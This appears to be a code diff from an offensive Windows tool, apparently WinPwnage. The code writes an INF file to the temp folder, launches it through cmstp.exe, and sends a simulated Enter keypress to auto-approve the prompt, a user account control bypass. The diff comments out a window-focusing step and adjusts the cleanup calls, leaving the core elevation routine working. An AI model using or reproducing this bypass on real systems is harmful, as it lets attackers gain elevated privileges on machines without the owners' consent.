@@ -74,16 +74,18 @@ ShortSvcName="WinPwnageVPN"
 		time.sleep(1)
 
 		if process().create("cmstp.exe", params="/au {tmp_path}".format(tmp_path=os.path.join(tempfile.gettempdir(), "tmp.ini")), window=False):
+		#if process().create("cmstp.exe", params="/au {tmp_path}".format(tmp_path=os.path.join(tempfile.gettempdir(), "tmp.ini")), window=True):
 			print_success("Successfully triggered installation of ini file using cmstp binary")
 		else:
 			print_error("Unable to trigger installation of ini file using cmstp binary")
 			for x in Constant.output:
 				if "error" in x:
-					cmstp_cleanup(path)
+					cmstp_cleanup()
 					return False
 
 		time.sleep(1)
 
+		"""
 		hwnd = ctypes.windll.user32.FindWindowA(None, "WinPwnageVPN")
 		if hwnd:
 			print_success("Successfully detected process window - hwnd ({hwnd})".format(hwnd=hwnd))
@@ -91,10 +93,10 @@ ShortSvcName="WinPwnageVPN"
 			print_error("Unable to detect process window, cannot proceed")
 			for x in Constant.output:
 				if "error" in x:
-					cmstp_cleanup(path)
+					cmstp_cleanup()
 					return False
 
-		time.sleep(1)	
+		time.sleep(1)
 
 		if ctypes.windll.user32.SetForegroundWindow(hwnd):
 			print_success("Activated window using SetForegroundWindow - hwnd ({hwnd})".format(hwnd=hwnd))			
@@ -102,21 +104,24 @@ ShortSvcName="WinPwnageVPN"
 			print_error("Unable to activate window using SetForegroundWindow - hwnd ({hwnd})".format(hwnd=hwnd))
 			for x in Constant.output:
 				if "error" in x:
-					cmstp_cleanup(path)
+					cmstp_cleanup()
 					return False		
-
-		time.sleep(1)	
+		
+		time.sleep(1)
+		"""
 
 		if ctypes.windll.user32.keybd_event(0x0D,0,0,0):
-			print_success("Successfully sent keyboard-event to window - hwnd ({hwnd})".format(hwnd=hwnd))
+			#print_success("Successfully sent keyboard-event to window - hwnd ({hwnd})".format(hwnd=hwnd))
+			print_success("Successfully sent keyboard-event to window")
 			time.sleep(5)
 			cmstp_cleanup()
 		else:
-			print_error("Unable to send keyboard-event to window - hwnd ({hwnd})".format(hwnd=hwnd))
+			#print_error("Unable to send keyboard-event to window - hwnd ({hwnd})".format(hwnd=hwnd))
+			print_error("Unable to send keyboard-event to window")
 			for x in Constant.output:
 				if "error" in x:
-					cmstp_cleanup(path)
+					cmstp_cleanup()
 					return False
 	else:
 		print_error("Cannot proceed, invalid payload")
-		return False			
+		return False
